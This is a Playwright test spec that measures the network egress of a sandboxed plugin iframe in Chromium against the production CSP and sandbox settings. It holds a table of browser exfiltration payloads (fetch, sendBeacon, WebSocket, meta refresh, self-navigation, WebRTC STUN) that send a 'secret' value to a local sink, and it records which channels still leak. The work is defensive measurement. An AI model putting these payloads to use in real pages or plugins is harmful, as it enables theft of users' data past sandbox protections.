/**
 * ADR 1021 (IA67-6) — the ui-plugins frame's egress, measured in a real Chromium.
 *
 * Why this exists: the plugin frame was described as "egress-denied, no network
 * requests" because its CSP header has `default-src 'none'` and no `connect-src`.
 * ADR 1017 M1 measured that a frame running scripts reaches the network anyway.
 * Plugins need scripts, so ADR 1017's static-until-consent cure does not fit. This
 * spec measures the plugin posture itself, reusing the production values:
 *  - the frame document is served over HTTP with `pluginFrameCsp()`, the one
 *    builder the backend frame route sends (ADR 0840), and
 *  - it is mounted by `src` under `PLUGIN_SANDBOX` with `referrerpolicy="no-referrer"`,
 *    as `PluginFrame.tsx` does.
 * Sinks: a local HTTP server (requests AND bare TCP connections) and a UDP socket
 * (WebRTC STUN). Every channel asserted blocked has a CONTROL that leaks with the one
 * protection removed, so a zero is not the sink being deaf. The RESIDUAL legs
 * (self-navigation, meta refresh, WebRTC) are asserted to leak: they are the premise
 * of the UI copy, and if a browser closes one this goes red and the copy can change.
 * In production the SPA's own `frame-src` (firebase.json) also limits where the frame
 * can navigate, to `'self'` and two Google hosts (ADR 1021 D9 removed
 * `https://*.firebaseapp.com`, which admitted any Firebase project); the spec
 * measures that too. A "leak" row here is the frame posture alone, which is what an
 * adopter serving the SPA without that policy gets.
 * Not asserted: `preconnect` and `dns-prefetch`. Measured for ADR 1021: Chromium
 * opened no preconnect socket to the loopback sink even from an unsandboxed page, so
 * there is no control that could make a zero mean anything.
 * Self-contained: no app server, no backend process.
 */
import { test, expect, type Page } from '@playwright/test';
import http from 'node:http';
import dgram from 'node:dgram';
import type { AddressInfo } from 'node:net';
import { readFileSync } from 'node:fs';
import { PLUGIN_SANDBOX } from '../src/features/ui-plugins/pluginSandbox.js';
import { pluginFrameCsp, pluginIframeCsp, pluginSandboxTokens } from '../../../backend/typescript/src/host/uiPluginRpc.js';

let hits: string[] = [];
let selfHits: string[] = [];
let udpPackets = 0;
let tcpConnections = 0;
let sinkServer: http.Server;
let frameServer: http.Server;
let udp: dgram.Socket;
let sinkPort = 0;
let framePort = 0;
let udpPort = 0;
let mounts = 0;

/** What the frame server sends for the next mount. `csp: null` sends no header. */
interface Posture { sandbox: string; csp: string | null; body: string; parentCsp?: string }
let posture: Posture = { sandbox: PLUGIN_SANDBOX, csp: pluginFrameCsp(), body: '' };

test.beforeAll(async () => {
  sinkServer = http.createServer((req, res) => {
    hits.push(req.url ?? '');
    // A navigation answered 204 sends its request but loads no document.
    if (req.url?.startsWith('/nocontent')) { res.statusCode = 204; res.end(); return; }
    res.end('ok');
  });
  sinkServer.on('connection', () => { tcpConnections += 1; });
  await new Promise<void>((r) => sinkServer.listen(0, '127.0.0.1', () => r()));
  sinkPort = (sinkServer.address() as AddressInfo).port;

  // One origin serves the host page, the frame document, and a same-origin sink
  // (`/selfsink`), which is what a parent `frame-src 'self'` admits.
  frameServer = http.createServer((req, res) => {
    if (req.url?.startsWith('/selfsink')) { selfHits.push(req.url); res.end('ok'); return; }
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    if (req.url?.startsWith('/frame')) {
      if (posture.csp !== null) res.setHeader('Content-Security-Policy', posture.csp);
      res.setHeader('X-Content-Type-Options', 'nosniff');
      res.end(`<!doctype html><html><head></head><body>${posture.body}</body></html>`);
      return;
    }
    if (posture.parentCsp) res.setHeader('Content-Security-Policy', posture.parentCsp);
    // `frameLoads` counts the iframe's document loads, as a parent-side teardown would.
    res.end(`<!doctype html><html><body style="margin:0"><iframe sandbox="${posture.sandbox}" src="/frame" referrerpolicy="no-referrer" onload="window.frameLoads=(window.frameLoads||0)+1" style="width:400px;height:300px;border:0"></iframe></body></html>`);
  });
  await new Promise<void>((r) => frameServer.listen(0, '127.0.0.1', () => r()));
  framePort = (frameServer.address() as AddressInfo).port;

  udp = dgram.createSocket('udp4');
  udp.on('message', () => { udpPackets += 1; });
  await new Promise<void>((r) => udp.bind(0, '127.0.0.1', () => r()));
  udpPort = udp.address().port;
});

test.afterAll(async () => {
  await new Promise<void>((r) => sinkServer.close(() => r()));
  await new Promise<void>((r) => frameServer.close(() => r()));
  udp.close();
});

const sink = (path: string): string => `http://127.0.0.1:${sinkPort}/${path}?d=secret`;

const PAYLOADS = (): Record<string, string> => ({
  fetch: `<script>fetch('${sink('fetch')}',{mode:'no-cors'}).catch(()=>{})</script>`,
  xhr: `<script>try{const x=new XMLHttpRequest();x.open('GET','${sink('xhr')}');x.send()}catch(e){}</script>`,
  sendBeacon: `<script>try{navigator.sendBeacon('${sink('beacon')}','x')}catch(e){}</script>`,
  webSocket: `<script>try{new WebSocket('ws://127.0.0.1:${sinkPort}/ws?d=secret')}catch(e){}</script>`,
  eventSource: `<script>try{new EventSource('${sink('sse')}')}catch(e){}</script>`,
  img: `<img src="${sink('img')}">`,
  cssBackground: `<div style="width:10px;height:10px;background:url(${sink('css')})"></div>`,
  nestedFrame: `<iframe src="${sink('nested')}"></iframe>`,
  worker: `<script>try{new Worker(URL.createObjectURL(new Blob(["fetch('${sink('worker')}')"],{type:'text/javascript'})))}catch(e){}</script>`,
  prefetch: `<link rel="prefetch" href="${sink('prefetch')}">`,
  form: `<form action="${sink('form')}" method="get"><input name="d" value="secret"></form><script>document.forms[0].submit()</script>`,
  popup: `<script>window.open('${sink('popup')}')</script>`,
  topNavigation: `<script>try{top.location='${sink('top')}'}catch(e){}</script>`,
  selfNavigation: `<script>location.href='${sink('selfnav')}'</script>`,
  metaRefresh: `<meta http-equiv="refresh" content="0;url=${sink('meta')}">`,
  webrtc: `<script>try{const pc=new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:${udpPort}'}]});pc.createDataChannel('x');pc.createOffer().then(o=>pc.setLocalDescription(o))}catch(e){}</script>`,
});

interface Observed { hits: string[]; selfHits: string[]; udpPackets: number; tcpConnections: number }
const leaked = (o: Observed): boolean => o.hits.length > 0 || o.udpPackets > 0 || o.tcpConnections > 0;

/** Mount one frame under the given posture (production by default) and report what
 *  the sinks saw. The previous page is unloaded before the counters reset. */
async function mount(page: Page, opts: Partial<Posture> & { body: string }): Promise<Observed> {
  await page.goto('about:blank');
  posture = { sandbox: PLUGIN_SANDBOX, csp: pluginFrameCsp(), ...opts };
  hits = []; selfHits = []; udpPackets = 0; tcpConnections = 0;
  mounts += 1; // a fresh host URL per mount, so nothing is reused from the last one
  await page.goto(`http://127.0.0.1:${framePort}/host?n=${mounts}`);
  await page.waitForTimeout(1500);
  return { hits: [...hits], selfHits: [...selfHits], udpPackets, tcpConnections };
}

/** The app's own policy as Firebase Hosting serves it to the SPA page that embeds the
 *  plugin (read from firebase.json, not copied). */
function appCsp(): string {
  type Rule = { source: string; headers: { key: string; value: string }[] };
  type Site = { target?: string; headers?: Rule[] };
  const hosting = JSON.parse(readFileSync(new URL('../../../firebase.json', import.meta.url), 'utf8')).hosting as Site | Site[];
  const site = (Array.isArray(hosting) ? hosting : [hosting]).find((h) => (h.target ?? 'app') === 'app');
  const rule = site?.headers?.find((r) => r.source.startsWith('**/!('));
  const value = rule?.headers.find((h) => h.key.toLowerCase() === 'content-security-policy')?.value;
  if (!value) throw new Error('firebase.json: no app-wide Content-Security-Policy rule found');
  return value;
}

test('the attribute and the header impose the same sandbox (two layers, one value)', () => {
  expect(PLUGIN_SANDBOX).toBe(pluginSandboxTokens().join(' '));
  expect(pluginFrameCsp().startsWith(`sandbox ${PLUGIN_SANDBOX};`)).toBe(true);
});

test('request APIs and subresources: blocked by the policy, and each leaks without it (control)', async ({ page }) => {
  test.setTimeout(120_000);
  const names = ['fetch', 'xhr', 'sendBeacon', 'webSocket', 'eventSource', 'img', 'cssBackground', 'nestedFrame', 'worker', 'prefetch'];
  for (const name of names) {
    const body = PAYLOADS()[name]!;
    const prod = await mount(page, { body });
    expect({ name, ...prod }).toEqual({ name, hits: [], selfHits: [], udpPackets: 0, tcpConnections: 0 });
    expect(leaked(await mount(page, { body, csp: null })), `${name}: control with no CSP header`).toBe(true);
  }
});

test('form, popup and top navigation: blocked by the sandbox, and each leaks with its token on both layers (control)', async ({ page }) => {
  test.setTimeout(60_000);
  for (const [name, token] of [['form', 'allow-forms'], ['popup', 'allow-popups'], ['topNavigation', 'allow-top-navigation']] as const) {
    const body = PAYLOADS()[name]!;
    expect(leaked(await mount(page, { body })), `${name}: production`).toBe(false);
    // The header's `sandbox` re-imposes the flags, so the control has to drop it too.
    expect(leaked(await mount(page, { body, sandbox: `${PLUGIN_SANDBOX} ${token}`, csp: null })), `${name}: control with ${token}`).toBe(true);
  }
});

test("form-action 'none' blocks a form even if both sandbox layers allow forms (ADR 1021 D2)", async ({ page }) => {
  const sandbox = `${PLUGIN_SANDBOX} allow-forms`;
  const withAllowForms = (policy: string): string => `sandbox ${sandbox}; ${policy}`;
  expect(pluginIframeCsp()).toContain("form-action 'none'");
  expect(leaked(await mount(page, { body: PAYLOADS().form!, sandbox, csp: withAllowForms(pluginIframeCsp()) }))).toBe(false);
  // Control: the same policy without the directive. form-action does not fall back to default-src.
  const without = pluginIframeCsp().replace("; form-action 'none'", '');
  expect(leaked(await mount(page, { body: PAYLOADS().form!, sandbox, csp: withAllowForms(without) }))).toBe(true);
});

test('RESIDUAL: self-navigation, meta refresh and WebRTC still leak under the frame posture (the UI copy\'s premise)', async ({ page }) => {
  expect((await mount(page, { body: PAYLOADS().selfNavigation! })).hits).toContain('/selfnav?d=secret');
  expect((await mount(page, { body: PAYLOADS().metaRefresh! })).hits).toContain('/meta?d=secret');
  expect((await mount(page, { body: PAYLOADS().webrtc! })).udpPackets).toBeGreaterThan(0);
});

test('counting the frame\'s loads cannot catch a navigation (why ADR 1021 D5 rejected a teardown)', async ({ page }) => {
  // A 204 answer sends the request and loads no document, so no second load fires.
  // After the plugin's own load, as a plugin that has been running would.
  const later = (url: string): string => `<script>addEventListener('load',()=>setTimeout(()=>{location.href='${url}'},0))</script>`;
  const loads = (): Promise<number | undefined> => page.evaluate(() => (window as unknown as { frameLoads?: number }).frameLoads);
  const noContent = await mount(page, { body: later(sink('nocontent')) });
  expect(noContent.hits).toContain('/nocontent?d=secret');
  expect(await loads()).toBe(1);
  // A navigation started while the plugin's own document is still loading: the ONLY
  // load the parent sees is the new page's.
  expect((await mount(page, { body: PAYLOADS().selfNavigation! })).hits).toContain('/selfnav?d=secret');
  expect(await loads()).toBe(1);
  // Control: a navigation after the plugin loaded, to a page, is a second load.
  expect((await mount(page, { body: later(sink('selfnav')) })).hits).toContain('/selfnav?d=secret');
  expect(await loads()).toBe(2);
});

test("the EMBEDDER's frame-src limits where the frame can navigate; WebRTC ignores it", async ({ page }) => {
  const parentCsp = appCsp();
  expect(parentCsp).toMatch(/frame-src 'self'/);
  // ADR 1021 D9: the app policy names no Firebase wildcard (any project, an attacker's included).
  expect(parentCsp.split(';').find((d) => d.trim().startsWith('frame-src'))).not.toMatch(/\*\.(firebaseapp\.com|web\.app)/);
  // Third-party sink: not an origin the app's (updated) frame-src admits.
  expect(leaked(await mount(page, { body: PAYLOADS().selfNavigation!, parentCsp }))).toBe(false);
  expect(leaked(await mount(page, { body: PAYLOADS().metaRefresh!, parentCsp }))).toBe(false);
  // Control: a URL the app's frame-src admits ('self') is reached.
  expect((await mount(page, { body: `<script>location.href='/selfsink?d=secret'</script>`, parentCsp })).selfHits).toEqual(['/selfsink?d=secret']);
  expect((await mount(page, { body: `<meta http-equiv="refresh" content="0;url=/selfsink?d=secret">`, parentCsp })).selfHits).toEqual(['/selfsink?d=secret']);
  expect((await mount(page, { body: PAYLOADS().webrtc!, parentCsp })).udpPackets).toBeGreaterThan(0);
});

test("CSP webrtc 'block' is ignored by this Chromium (ADR 1021 D6: red here means it can be added)", async ({ page }) => {
  const o = await mount(page, { body: PAYLOADS().webrtc!, csp: `${pluginFrameCsp()}; webrtc 'block'` });
  expect(o.udpPackets).toBeGreaterThan(0);
});
